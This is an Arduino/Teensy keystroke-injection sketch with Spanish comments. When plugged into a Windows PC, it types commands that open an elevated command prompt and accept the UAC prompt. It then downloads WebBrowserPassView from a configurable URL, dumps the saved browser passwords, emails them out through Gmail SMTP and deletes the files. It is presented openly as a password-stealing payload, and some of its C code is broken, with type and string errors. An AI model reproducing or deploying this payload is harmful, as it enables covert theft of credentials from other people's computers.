/*
Funciones para hacer más fácil la programación de la placa, hecho por el usuario:
https://github.com/H3LL0WORLD/

¿Qué hace este script?:
    - Este script consigue descargar desde un servidor donde se aloje el archivo webbrowserpassview (http://www.nirsoft.net/utils/web_browser_password.html),
lo guarda en los archivos temporales y posteriormente lo envia a una dirección de correo especificada por el usuario

*/

#include <string.h>

// Pin a usar
#define ledPin 13

void setup()
{
    pinMode(ledPin, OUTPUT);

    // ARRANQUE SEGURO...
    Arranque();

    // Ejecucion del payload...
    Payload();
}

void loop()
{
  // Este es un programa que correrá solo una vez asi que no necesitamos esta parte
}


// Funciones

void escribir(String texto, int repetir = 1, boolean enter = false)
{
    for (int i = 0; i < repetir; i++)
    {
      if (enter) Keyboard.println(texto);
      else Keyboard.print(texto);

      Keyboard.send_now();
      limpiarKeys();
    }
}

void Escribir(String texto, int repetir = 1)
{
    escribir(texto, repetir, true);
}

// Vacia el buffer de teclas presionadas
void limpiarKeys()
{
    Keyboard.set_modifier(0);
    Keyboard.set_key1(0);
    Keyboard.set_key2(0);
    Keyboard.send_now();
}

void combinacion(int key, int mod)
{
    Keyboard.set_modifier(mod);
    Keyboard.set_key1(key);
    Keyboard.send_now();
    limpiarKeys();
}

void CTRL_ALT (int key = 0)
{
    combinacion(key, MODIFIERKEY_CTRL|MODIFIERKEY_ALT);
}

void CTRL_SHIFT (int key = 0)
{
    combinacion(key, MODIFIERKEY_CTRL|MODIFIERKEY_SHIFT);
}

void GUI_SHIFT (int key = 0)
{
    combinacion(key, MODIFIERKEY_GUI|MODIFIERKEY_SHIFT);
}

void CTRL(int key = 0)
{
    combinacion(key, MODIFIERKEY_CTRL);
}

void SHIFT(int key = 0)
{
    combinacion(key, MODIFIERKEY_SHIFT);
}

void GUI(int key = 0)
{
    combinacion(key, MODIFIERKEY_GUI);
}

void ALT(int key = 0)
{
    combinacion(key, MODIFIERKEY_ALT);
}

void ALTGR(int key = 0)
{
    combinacion(key, MODIFIERKEY_RIGHT_ALT);
}

void k(int key)
{
    Keyboard.set_key1(key);
    Keyboard.send_now();
    limpiarKeys();
}

void Tecla(int key)
{
    k(key);
}

void Arriba()
{
    k(KEY_UP);
}

void Abajo()
{
    k(KEY_DOWN);
}

void Izq()
{
    k(KEY_LEFT);
}

void Der()
{
    k(KEY_RIGHT);
}

void Enter()
{
    k(KEY_ENTER);
}

void Tab()
{
    k(KEY_TAB);
}
//------------------------------------------------//
//             Simplificar Teclas                 //
//------------------------------------------------//
    int A = KEY_A;
    int B = KEY_B;
    int C = KEY_C;
    int D = KEY_D;
    int E = KEY_E;
    int F = KEY_F;
    int G = KEY_G;
    int H = KEY_H;
    int I = KEY_I;
    int J = KEY_J;
    int K = KEY_K;
    int L = KEY_L;
    int M = KEY_M;
    int N = KEY_N;
    int N_ = 61491;
    int O = KEY_O;
    int P = KEY_P;
    int Q = KEY_Q;
    int R = KEY_R;
    int S = KEY_S;
    int T = KEY_T;
    int U = KEY_U;
    int V = KEY_V;
    int W = KEY_W;
    int X = KEY_X;
    int Y = KEY_Y;
    int Z = KEY_Z;

    int N_0 = KEY_0;
    int N_1 = KEY_1;
    int N_2 = KEY_2;
    int N_3 = KEY_3;
    int N_4 = KEY_4;
    int N_5 = KEY_5;
    int N_6 = KEY_6;
    int N_7 = KEY_7;
    int N_8 = KEY_8;
    int N_9 = KEY_9;

    int F1 = KEY_F1;
    int F2 = KEY_F2;
    int F3 = KEY_F3;
    int F4 = KEY_F4;
    int F5 = KEY_F5;
    int F6 = KEY_F6;
    int F7 = KEY_F7;
    int F8 = KEY_F8;
    int F9 = KEY_F9;
    int F10 = KEY_F10;
    int F11 = KEY_F11;
    int F12 = KEY_F12;

    int CTRL_IZQ  = MODIFIERKEY_LEFT_CTRL;
    int CTRL_DER  = MODIFIERKEY_RIGHT_CTRL;
    int SHIFT_IZQ = MODIFIERKEY_LEFT_SHIFT;
    int SHIFT_DER = MODIFIERKEY_RIGHT_SHIFT;
    int GUI_IZQ   = MODIFIERKEY_LEFT_GUI;
    int GUI_DER   = MODIFIERKEY_RIGHT_GUI;
    int ALT_IZQ   = MODIFIERKEY_LEFT_ALT;
    int ALT_DER   = MODIFIERKEY_RIGHT_ALT;

    int ESC        = KEY_ESC;
    int TABULADOR  = KEY_TAB;
    int BLOQ_MAYUS = KEY_CAPS_LOCK;
    int ESPACIO    = KEY_SPACE;
    int ENTER      = KEY_ENTER;
    int BORRAR     = KEY_BACKSPACE;
    int IMP_PNT    = KEY_PRINTSCREEN;
    int SUPR       = KEY_DELETE;
    int INICIO     = KEY_HOME;
    int FIN        = KEY_END;
    int AV_PAG     = KEY_PAGE_UP;
    int RE_PAG     = KEY_PAGE_DOWN;

    int ARRIBA    = KEY_UP;
    int ABAJO     = KEY_DOWN;
    int IZQUIERDA = KEY_LEFT;
    int DERECHA   = KEY_RIGHT;
//------------------------------------------------//

// Revisar si el bloq mayus esta activo.
boolean checkBloqMayus()
{
    if ((LEDsActivos() & 2) == 2)
    {
        return true;
    }
    else
    {
        return false;
    }
}

unsigned int LEDsActivos()
{
    return int(keyboard_leds);
}

void returnCode(unsigned int numBlinks, unsigned int halfDelay)
{
    unsigned int count=0;
    for(count = 0; count != numBlinks; count++)
    {
        digitalWrite(ledPin, HIGH);
        delay(halfDelay);
        digitalWrite(ledPin, LOW);
        delay(halfDelay);
    }
}

// Desactivar Bloq. Mayus
void killBloqMayus()
{
    if (checkBloqMayus())
    {
        Tecla(BLOQ_MAYUS);
    }
}

// Esperar a que podamos usar el teclado, comprobando si podemos activar el Bloq. Mayus.
void Arranque()
{
    boolean listo= checkBloqMayus();
    while (listo == checkBloqMayus())
    {
        returnCode(1, 500);
        Tecla(BLOQ_MAYUS);
    }
    Tecla(BLOQ_MAYUS);
}

void Inicio()
{
    killBloqMayus();

    // Encender y apagar el led para indicar que el payload se ejecutará...
    returnCode(1, 100);
    limpiarKeys();
}

// Encender y apagar el led para indicar que el payload se ha ejecutado..
void Fin()
{
    returnCode(1, 100);
}



void Payload()
{
    // Declaración de variables
    char nombre_del_archivo[] = "Insertar el nombre del archivo aqui";
    string email_para_recibir = "Insertar email receptor";
    string pass = "contraseña del email que envia el mensaje";
    string url_del_archivo = "url_del_archivo";
    char nombre_del_archivo_pass = "nombre a poner en el archivo de las contraseñas";


    // Comienzo del script
    Inicio();
      // Desde donde se enviará el correo
      // Debe tener activado el acceso a aplicaciones menos seguras: http://www.google.com/settings/security/lesssecureapps
      #define FROM email_para_recibir

      // Contraseña correo
      #define PASS pass

      // Correo al cual se enviará la información.
      #define TO email_para_recibir

      // Delay promedio en milisegundos
      int ds = 1000;

      GUI(R);
      delay(ds/2);

      // CMD AS ADMIN
      Escribir("powershell Start-Process cmd.exe -Verb runAs");
      delay(ds*5);

      // Aceptar cuadro de dialogo
      ALT(S);       // Windows 10
      ALT(Y);       // Windows 7
      delay(ds*5);

      Enter();

      /***************** Mover la ventana y ocultar *****************/
      //Escribir("echo off & mode con:cols=15 lines=15");

      /********************* **************** *********************/

      //Descargar webbrowserpassview dependiendo la arquitectura del OS

      Escribir("CD %TMP%");
      delay(ds);
      Escribir("powershell (new-object System.Net.WebClient).DownloadFile(url_del_archivo,nombre_del_archivo)");
      delay(ds*6);
      Escribir("WebBrowserPassView.exe /stext nombre_del_archivo_pass");
      delay(ds*6);

      //Enviar Log por correo
      Escribir("powershell");
      Escribir("$SMTPServer = 'smtp.gmail.com'");           // GMAIL
      Escribir("$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)");
      Escribir("$SMTPInfo.EnableSsl = $true");
      Escribir("$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('"FROM"', '"PASS"')");
      Escribir("$ReportEmail = New-Object System.Net.Mail.MailMessage");
      Escribir("$ReportEmail.From = '"FROM"'");
      Escribir("$ReportEmail.To.Add('"TO"')");
      Escribir("$ReportEmail.Subject = 'Passwords'");
      Escribir("$ReportEmail.Body = (Get-Content nombre_del_archivo_pass | out-string)");
      Escribir("$SMTPInfo.Send($ReportEmail)");
      Escribir("exit");
      Escribir("del /Q nombre_del_archivo_pass & del  /Q nombre_del_archivo");
      Escribir("exit");
    Fin();
    // Finalización del script
}
